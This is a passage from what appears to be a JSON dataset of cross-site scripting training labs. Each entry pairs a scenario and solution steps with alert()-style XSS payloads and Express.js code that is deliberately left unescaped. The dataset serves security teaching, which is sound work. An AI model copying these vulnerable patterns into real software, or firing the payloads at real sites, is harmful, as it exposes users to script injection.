    "srcCode": "const express = require('express');\nconst app = express();\nlet customText = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/customize', (req, res) => {\n  customText = req.body.text;\n  res.redirect('/preview');\n});\n\napp.get('/preview', (req, res) => {\n  res.send(`<html><body><div class='shirt'>${customText}</div></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in User Feedback Preview",
    "Lab Description": "The application allows users to preview their feedback before submission. The preview is rendered using innerHTML without sanitization, making it vulnerable to reflected XSS. The feedback text is taken from a query parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to the feedback preview page with a crafted payload in the URL.",
      "Inject a payload that executes when rendered in the preview section.",
      "Observe alert execution when the preview is loaded."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/feedback-preview', (req, res) => {\n  const message = req.query.message || '';\n  res.send(`\n    <html>\n      <body>\n        <h2>Feedback Preview</h2>\n        <div id='preview'>${message}</div>\n        <a href='/'>Back</a>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS via Contact Form Rendering in Admin Panel",
    "Lab Description": "The application stores contact form messages in a database. The admin panel renders these messages without encoding, resulting in stored XSS when a message contains malicious JavaScript.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a contact form with a malicious script as the message.",
      "Log in as admin or trigger an admin to view the message panel.",
      "Confirm that the script executes in the admin panel."
    ],
    "payloads": [
      "<script>alert('admin')</script>",
      "<img src=x onerror=alert('admin')>",
      "<svg/onload=alert('admin')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet messages = [];\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/contact', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <form method='POST' action='/contact'>\n          <input name='name'>\n          <textarea name='message'></textarea>\n          <button type='submit'>Send</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/contact', (req, res) => {\n  messages.push(req.body);\n  res.redirect('/contact');\n});\n\napp.get('/admin/messages', (req, res) => {\n  let output = messages.map(m => `<li>${m.message}</li>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>Messages</h2>\n        <ul>${output}</ul>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "DOM-based XSS in Search Suggestion Autocomplete",
    "Lab Description": "The app provides live search suggestions using JavaScript and appends search terms directly to the DOM using innerHTML. If the search term is attacker-controlled, this introduces DOM-based XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Inject a payload via the search query string.",
      "Observe that the payload is reflected in the DOM as raw HTML.",
      "Trigger the payload to cause script execution."
    ],
    "payloads": [
      "\"><script>alert(1)</script>",
      "<img src=x onerror=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const term = req.query.q || '';\n  res.send(`\n    <html>\n      <body>\n        <h2>Search</h2>\n        <div id='results'></div>\n        <script>\n          let results = document.getElementById('results');\n          results.innerHTML = 'Suggestions for: ${term}';\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Blog Comment Section",
    "Lab Description": "Users can leave comments on blog posts. Comments are stored and displayed using innerHTML without sanitization, allowing stored XSS if an attacker injects a malicious script.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a comment containing a JavaScript payload.",
      "Visit the blog post again or have another user view it.",
      "Script execution will occur if vulnerable."
    ],
    "payloads": [
      "<script>alert('blog')</script>",
      "<svg/onload=alert('blog')>",
      "<img src=x onerror=alert('blog')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet comments = [];\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/blog', (req, res) => {\n  let commentHtml = comments.map(c => `<p>${c}</p>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>My Blog</h2>\n        ${commentHtml}\n        <form action='/comment' method='POST'>\n          <input name='comment'>\n          <button type='submit'>Post</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/comment', (req, res) => {\n  comments.push(req.body.comment);\n  res.redirect('/blog');\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in Error Message Display",
    "Lab Description": "The app includes a debug mode that shows detailed error messages with user input echoed back on failure. The error is printed inside the HTML body using unsanitized user data, leading to reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Trigger an error by sending a malformed input with a script payload.",
      "Observe that the payload is rendered in the error message.",
      "Script should execute when error page loads."
    ],
    "payloads": [
      "<script>alert('err')</script>",
      "<img src=x onerror=alert('err')>",
      "<svg/onload=alert('err')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/debug', (req, res) => {\n  const q = req.query.q;\n  if (!q || q.length < 3) {\n    res.send(`\n      <html>\n        <body>\n          <h2>Error</h2>\n          <p>Invalid input: ${q}</p>\n        </body>\n      </html>\n    `);\n  } else {\n    res.send('<p>Valid input received</p>');\n  }\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "DOM XSS via Profile Settings JSON Reflection",
    "Lab Description": "The app allows users to update their profile settings via a JSON-based endpoint. The server reflects user input into the page using a script block and JSON.parse without escaping. This allows XSS when crafted JSON is interpreted as script.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a profile update containing a malicious string.",
      "The server reflects the data into a script block inside a JSON object.",
      "Script executes due to improper escaping."
    ],
    "payloads": [
      "\"><script>alert(1)</script>",
      "</script><script>alert(1)</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet profile = { bio: 'Welcome!' };\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/profile', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <script>\n          const profile = JSON.parse('{\"bio\":\"${profile.bio}\"}');\n          document.write('<p>' + profile.bio + '</p>');\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/profile-update', (req, res) => {\n  profile.bio = req.body.bio;\n  res.redirect('/profile');\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Custom Status Messages",
    "Lab Description": "Users can set a custom status message. The message is displayed in their profile and stored server-side. When other users visit the profile, the unsanitized message renders as HTML, enabling stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set your custom status with a JavaScript payload.",
      "Visit your profile page or another user\u00e2\u20ac\u2122s profile page where the message appears.",
      "Observe script execution."
    ],
    "payloads": [
      "<script>alert('status')</script>",
      "<img src=x onerror=alert('status')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet status = '';\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/profile', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>User Profile</h2>\n        <p>Status: ${status}</p>\n        <form method='POST' action='/status'>\n          <input name='status'>\n          <button type='submit'>Update</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/status', (req, res) => {\n  status = req.body.status;\n  res.redirect('/profile');\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in Notification Popup via Query Parameter",
    "Lab Description": "The app shows a welcome notification popup if a `msg` parameter is passed in the URL. The message is injected into the DOM using innerHTML, allowing reflected XSS via the query string.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Navigate to the homepage with a crafted `msg` parameter containing a script.",
      "Observe that the payload is injected into a notification popup.",
      "Payload should execute when page loads."
    ],
    "payloads": [
      "<script>alert('notif')</script>",
      "<svg/onload=alert('notif')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  const msg = req.query.msg || '';\n  res.send(`\n    <html>\n      <body>\n        <div id='popup'></div>\n        <script>\n          document.getElementById('popup').innerHTML = '${msg}';\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS via Username in Public Posts",
    "Lab Description": "Users can publish short posts under their usernames. The app displays the posts along with the username, but does not sanitize it, allowing stored XSS via username injection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Register a new user with a malicious payload as the username.",
      "Create a post and view the public timeline.",
      "Script executes as part of the username."
    ],
    "payloads": [
      "<img src=x onerror=alert('user')>",
      "<script>alert('user')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet posts = [];\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/timeline', (req, res) => {\n  const feed = posts.map(p => `<li><strong>${p.user}:</strong> ${p.text}</li>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <ul>${feed}</ul>\n        <form method='POST' action='/post'>\n          <input name='user'>\n          <input name='text'>\n          <button type='submit'>Post</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/post', (req, res) => {\n  posts.push({ user: req.body.user, text: req.body.text });\n  res.redirect('/timeline');\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "DOM-based XSS via Hash Fragment Injection",
    "Lab Description": "The app reads the `location.hash` value and writes it directly into the DOM using innerHTML to simulate tab switching. An attacker can craft a malicious link with a script in the hash fragment.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Craft a URL with a script payload inside the hash fragment.",
      "Send the link to a victim or open it in the browser.",
      "Observe script execution from the hash value."
    ],
    "payloads": [
      "#<img src=x onerror=alert(1)>",
      "#<script>alert(1)</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <div id='tab'></div>\n        <script>\n          const tab = location.hash.substring(1);\n          document.getElementById('tab').innerHTML = tab;\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS via Error Message in Email Reset",
    "Lab Description": "The app includes an email reset form that returns an error message if the email is invalid. The error is reflected in the page without proper encoding, leading to reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit an invalid email that includes a script tag.",
      "The error message will include the email you entered.",
      "Script executes in the error message block."
    ],
    "payloads": [
      "<script>alert('email')</script>",
      "<img src=x onerror=alert('email')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/reset', (req, res) => {\n  const error = req.query.error || '';\n  res.send(`\n    <html>\n      <body>\n        <form method='POST' action='/reset'>\n          <input name='email'>\n          <button type='submit'>Reset Password</button>\n        </form>\n        <div>${error}</div>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/reset', (req, res) => {\n  const email = req.body.email;\n  if (!email.includes('@')) {\n    res.redirect(`/reset?error=Invalid email: ${email}`);\n  } else {\n    res.redirect('/reset');\n  }\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Event Title on Calendar App",
    "Lab Description": "A calendar app allows users to add events with a title and description. The event title is displayed without sanitization, making the app vulnerable to stored XSS when a malicious title is entered.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create an event with a payload as the title.",
      "View the calendar where the event title is displayed.",
      "Payload triggers script execution."
    ],
    "payloads": [
      "<script>alert('calendar')</script>",
      "<img src=x onerror=alert('calendar')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet events = [];\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/calendar', (req, res) => {\n  const list = events.map(e => `<li>${e.title}</li>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <ul>${list}</ul>\n        <form method='POST' action='/event'>\n          <input name='title'>\n          <input name='desc'>\n          <button type='submit'>Add Event</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/event', (req, res) => {\n  events.push({ title: req.body.title, desc: req.body.desc });\n  res.redirect('/calendar');\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "DOM XSS via Search Suggestion Rendering",
    "Lab Description": "As users type into the search bar, the app fetches and renders suggestions directly from the server. Suggestions are injected using innerHTML, leading to DOM-based XSS when malicious entries are returned.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Trigger a suggestion request with a malicious input.",
      "Server reflects the input as one of the suggestions.",
      "Frontend renders suggestions with innerHTML, executing script."
    ],
    "payloads": [
      "<img src=x onerror=alert('suggest')>",
      "<script>alert('suggest')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/suggest', (req, res) => {\n  const q = req.query.q || '';\n  const suggestions = [`<li>${q}</li>`];\n  res.send(suggestions.join(''));\n});\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <input id='search'>\n        <ul id='results'></ul>\n        <script>\n          const input = document.getElementById('search');\n          input.addEventListener('input', async () => {\n            const res = await fetch('/suggest?q=' + input.value);\n            const text = await res.text();\n            document.getElementById('results').innerHTML = text;\n          });\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in Forum Search Results",
    "Lab Description": "A forum application includes a search page that displays the search query as part of the results heading. The query is injected directly into the HTML without encoding, allowing reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Navigate to the search page with a malicious query string.",
      "The query is reflected into a heading element.",
      "Script executes upon loading the results page."
    ],
    "payloads": [
      "<svg/onload=alert('search')>",
      "<script>alert('search')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const q = req.query.q || '';\n  res.send(`\n    <html>\n      <body>\n        <h2>Results for: ${q}</h2>\n        <form>\n          <input name='q'>\n          <button type='submit'>Search</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS via Feedback Widget",
    "Lab Description": "Users can leave feedback using a widget that displays the most recent comments on the homepage. The app fails to sanitize input before rendering, leading to persistent XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit feedback with a script payload.",
      "Reload the homepage to see the feedback appear.",
      "Payload is executed as part of the page render."
    ],
    "payloads": [
      "<script>alert('feedback')</script>",
      "<img src=x onerror=alert('feedback')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet feedback = [];\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/', (req, res) => {\n  const entries = feedback.map(f => `<p>${f}</p>`).join('');\n  res.send(`\n    <html>\n      <body>\n        ${entries}\n        <form method='POST' action='/feedback'>\n          <input name='text'>\n          <button type='submit'>Submit Feedback</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/feedback', (req, res) => {\n  feedback.push(req.body.text);\n  res.redirect('/');\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "DOM XSS in Chat Mention Highlighting",
    "Lab Description": "A real-time chat application highlights mentions (e.g., @username) by wrapping them with a span. The replacement is done using innerHTML without escaping, which can lead to DOM-based XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a message containing a crafted payload designed to look like a mention.",
      "The frontend processes and wraps mentions using innerHTML.",
      "Payload executes when viewed by others."
    ],
    "payloads": [
      "@<img src=x onerror=alert('mention')>",
      "@<svg onload=alert('mention')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\nlet messages = [];\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/chat', (req, res) => {\n  const list = messages.map(m => `<div>${m}</div>`).join('');\n  res.send(`\n    <html>\n      <body>\n        ${list}\n        <form action='/send' method='POST'>\n          <input name='msg'>\n          <button>Send</button>\n        </form>\n        <script>\n          const divs = document.querySelectorAll('div');\n          divs.forEach(d => {\n            d.innerHTML = d.innerHTML.replace(/@(\\w+)/g, '<span class=\"mention\">@$1</span>');\n          });\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/send', (req, res) => {\n  messages.push(req.body.msg);\n  res.redirect('/chat');\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in User Badge Label",
    "Lab Description": "The platform lets users set a badge label that appears next to their name. The label is rendered without output encoding, which leads to stored XSS when a malicious label is saved.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Change your profile badge to include a script payload.",
      "Visit a page where your badge is shown next to your name.",
      "Script executes in the profile viewer\u00e2\u20ac\u2122s browser."
    ],
    "payloads": [
      "<script>alert('badge')</script>",
      "<img src=x onerror=alert('badge')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet users = {};\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/profile/:user', (req, res) => {\n  const user = req.params.user;\n  const badge = users[user] || 'None';\n  res.send(`\n    <html>\n      <body>\n        <h2>${user} <span>${badge}</span></h2>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/setbadge', (req, res) => {\n  users[req.body.user] = req.body.badge;\n  res.redirect('/profile/' + req.body.user);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS via Invite Link Preview",
    "Lab Description": "The app lets users send invite links with custom messages. The message is reflected in the invite preview without encoding, which leads to reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Craft an invite URL with a message parameter containing script.",
      "Open the link and observe the message rendered on the page.",
      "Script executes in the preview area."
    ],
    "payloads": [
      "<script>alert('invite')</script>",
      "<img src=x onerror=alert('invite')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/invite', (req, res) => {\n  const msg = req.query.msg || '';\n  res.send(`\n    <html>\n      <body>\n        <h3>You were invited!</h3>\n        <p>${msg}</p>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS via Public Link Description",
    "Lab Description": "Users can share public links with descriptions. These are displayed in a shared gallery. The description field is vulnerable to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a new public link with a script payload as the description.",
      "Visit the shared links gallery page.",
      "Script executes in the context of every viewer."
    ],
    "payloads": [
      "<script>alert('shared')</script>",
      "<svg onload=alert('shared')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet links = [];\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/gallery', (req, res) => {\n  const out = links.map(l => `<li>${l.desc}</li>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <ul>${out}</ul>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/submit', (req, res) => {\n  links.push({ url: req.body.url, desc: req.body.desc });\n  res.redirect('/gallery');\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in Document Viewer Page Name",
    "Lab Description": "A document viewer allows previewing documents with a custom page name set via a query parameter. The page name is used in a heading without sanitization, enabling reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Send a GET request with the 'title' parameter including a payload.",
      "Observe the reflected unsanitized content in the heading.",
      "Payload is executed immediately."
    ],
    "payloads": [
      "<script>alert('doc')</script>",
      "<img src=x onerror=alert('doc')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/view', (req, res) => {\n  const title = req.query.title || 'Document';\n  res.send(`\n    <html>\n      <body>\n        <h1>${title}</h1>\n        <p>Document content goes here...</p>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "DOM XSS via Hash-Based Router in Single Page App",
    "Lab Description": "The application uses a hash-based router to load views in a single-page application. The router reads `window.location.hash` and uses `innerHTML` to insert dynamic content, allowing for DOM-based XSS via crafted URL fragments.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft a URL with a malicious script payload in the hash portion (after #).",
      "Load the URL in the browser and trigger SPA route handling.",
      "Script executes when inserted into the DOM."
    ],
    "payloads": [
      "#<img src=x onerror=alert('spa')>",
      "#<svg onload=alert('spa')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <div id='view'></div>\n        <script>\n          const frag = location.hash.slice(1);\n          document.getElementById('view').innerHTML = frag;\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS via Product FAQ Answer Field",
    "Lab Description": "Users can submit FAQs for products. The answer field is stored and later rendered without escaping. This allows persistent XSS via the answer field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a FAQ answer that includes script payloads.",
      "Visit the product page where FAQs are shown.",
      "Script executes in any visitor\u00e2\u20ac\u2122s browser."
    ],
    "payloads": [
      "<script>alert('faq')</script>",
      "<img src=x onerror=alert('faq')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet faqs = [];\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/product', (req, res) => {\n  const faqHtml = faqs.map(f => `<dt>${f.q}</dt><dd>${f.a}</dd>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>FAQs</h2>\n        <dl>${faqHtml}</dl>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/faq', (req, res) => {\n  faqs.push({ q: req.body.q, a: req.body.a });\n  res.redirect('/product');\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in Order Confirmation Message",
    "Lab Description": "After placing an order, the app displays a custom message using a `msg` query parameter. This parameter is reflected without escaping, leading to reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Craft a URL with a `msg` parameter containing a script payload.",
      "Load the page and observe execution in the confirmation message.",
      "Verify that the payload runs."
    ],
    "payloads": [
      "<script>alert('confirm')</script>",
      "<svg onload=alert('confirm')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/thankyou', (req, res) => {\n  const msg = req.query.msg || 'Thank you for your purchase!';\n  res.send(`\n    <html>\n      <body>\n        <h3>${msg}</h3>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS via Email Signature Setting",
    "Lab Description": "Users can customize an email signature that appears on every message they send. The signature is rendered as HTML without sanitization, allowing persistent XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set your email signature to a script-based payload.",
      "Send a message; the recipient will receive it with your signature rendered.",
      "Script executes when email is viewed."
    ],
    "payloads": [
      "<script>alert('signature')</script>",
      "<img src=x onerror=alert('signature')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet signatures = {};\nlet messages = [];\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/inbox/:user', (req, res) => {\n  const inbox = messages.filter(m => m.to === req.params.user);\n  const view = inbox.map(m => `<div><strong>${m.from}:</strong><p>${m.body}</p><p>${m.sig}</p></div>`).join('');\n  res.send(`<html><body>${view}</body></html>`);\n});\n\napp.post('/setsig', (req, res) => {\n  signatures[req.body.user] = req.body.sig;\n  res.redirect('/inbox/' + req.body.user);\n});\n\napp.post('/send', (req, res) => {\n  messages.push({\n    from: req.body.from,\n    to: req.body.to,\n    body: req.body.body,\n    sig: signatures[req.body.from] || ''\n  });\n  res.redirect('/inbox/' + req.body.to);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in JSONP Callback Parameter",
    "Lab Description": "An endpoint supports JSONP responses using a `callback` parameter. The callback name is not validated or sanitized, allowing XSS if script tags are injected.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a request to `/api?callback=<script>` or similar payload.",
      "Observe the response and execution of JavaScript from the crafted callback.",
      "Payload executes in browser if endpoint is loaded in `<script src>`."
    ],
    "payloads": [
      "<script>alert('jsonp')</script>",
      "alert('jsonp')"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/api', (req, res) => {\n  const callback = req.query.callback || 'callback';\n  const data = JSON.stringify({ msg: 'hello' });\n  res.set('Content-Type', 'application/javascript');\n  res.send(`${callback}(${data})`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in User-Generated Calendar Event Titles",
    "Lab Description": "The web calendar allows users to add events with custom titles and descriptions. Titles are rendered on the main calendar interface without sanitization, enabling persistent XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a new calendar event with a title that includes an XSS payload.",
      "Visit the calendar homepage where the event titles are listed.",
      "The script executes when the calendar renders the malicious event."
    ],
    "payloads": [
      "<script>alert('calendar')</script>",
      "<img src=x onerror=alert('calendar')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet events = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/calendar', (req, res) => {\n  const eventList = events.map(e => `<li>${e.title}</li>`).join('');\n  res.send(`<html><body><ul>${eventList}</ul><form action='/addevent' method='POST'><input name='title'><button>Add</button></form></body></html>`);\n});\n\napp.post('/addevent', (req, res) => {\n  events.push({ title: req.body.title });\n  res.redirect('/calendar');\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in Feedback Search Query",
    "Lab Description": "The feedback search feature reflects the user query directly into the results page title without proper escaping, allowing reflected XSS through the query string.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Send a search request with a script in the query parameter.",
      "Observe the reflected payload executing in the page response."
    ],
    "payloads": [
      "<script>alert('feedback')</script>",
      "<svg/onload=alert('feedback')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/feedback', (req, res) => {\n  const q = req.query.q || '';\n  res.send(`<html><body><h3>Results for: ${q}</h3></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in User-Supplied Video Titles",
    "Lab Description": "The video sharing platform allows users to upload videos and provide a title. These titles are rendered in the homepage feed without escaping, enabling persistent XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a new video with a malicious title containing script tags.",
      "Open the homepage feed to trigger script execution."
    ],
    "payloads": [
      "<script>alert('video')</script>",
      "<img src=x onerror=alert('video')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet videos = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/home', (req, res) => {\n  const list = videos.map(v => `<li>${v.title}</li>`).join('');\n  res.send(`<html><body><ul>${list}</ul><form action='/upload' method='POST'><input name='title'><button>Upload</button></form></body></html>`);\n});\n\napp.post('/upload', (req, res) => {\n  videos.push({ title: req.body.title });\n  res.redirect('/home');\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "DOM XSS via URL Fragment Injection in Dynamic Viewer",
    "Lab Description": "A dynamic viewer loads content based on the `window.location.hash` and directly injects it into the DOM. This leads to a DOM-based XSS vulnerability via the URL fragment.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft a URL with a malicious script in the fragment portion.",
      "Load the page to trigger DOM XSS."
    ],
    "payloads": [
      "#<img src=x onerror=alert('dom')>",
      "#<svg/onload=alert('dom')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html><body>\n      <div id='viewer'></div>\n      <script>\n        const frag = location.hash.slice(1);\n        document.getElementById('viewer').innerHTML = frag;\n      </script>\n    </body></html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Poll Option Text",
    "Lab Description": "Users can create polls and define custom options. Option text is rendered into a voting form without escaping, making the app vulnerable to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a poll with a malicious option payload.",
      "Load the poll voting page and trigger script execution."
    ],
    "payloads": [
      "<script>alert('poll')</script>",
      "<img src=x onerror=alert('poll')>"
    ],
    "Vulnerability name": "Cross-site scripting",
